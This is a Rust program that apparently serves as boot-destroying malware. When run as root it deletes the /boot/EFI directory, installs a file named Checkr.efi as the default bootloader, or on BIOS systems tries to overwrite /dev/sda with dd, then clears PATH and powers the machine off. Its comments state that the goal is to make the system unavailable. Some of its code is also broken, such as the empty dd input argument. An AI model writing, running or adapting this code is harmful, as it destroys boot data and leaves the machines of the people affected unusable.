use std::process;
use colored::Colorize;
use nix::unistd::Uid;
use std::fs;
use std::path;
use std::env;

fn copytoefi() -> Result<(), std::io::Error> {
    fs::remove_dir_all("/boot/EFI/").expect("failed to remove dirs");
    fs::create_dir_all("/boot/EFI/BOOT/").expect("failed to create dirs");
    fs::copy("Checkr.efi", "/boot/EFI/BOOT/BOOTX64.EFI").expect("failed to copy file");
    Ok(())
}

fn main() {
    let uid:bool = Uid::effective().is_root();
    if !uid {
        println!("{}", "This program must run as root.".red().bold());
        process::exit(42);
    }
    //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
    if path::Path::new("/sys/firmware/efi").exists() {
        println!("{}","uefi detected".green().bold());
        copytoefi().expect("failed to copy file");
    }
    else{
        println!("{}","bios detected".green().bold());
        process::Command::new("dd").arg("if=").arg("of=/dev/sda").spawn().expect("failed to execute process");
    }

    //*Set path var to an empty string to render the system unavailable.
    env::set_var("PATH", "");

    //*Finally it reboots the computer.
    let _reboot = nix::sys::reboot::reboot(nix::sys::reboot::RebootMode::RB_POWER_OFF);

    process::exit(0);
}
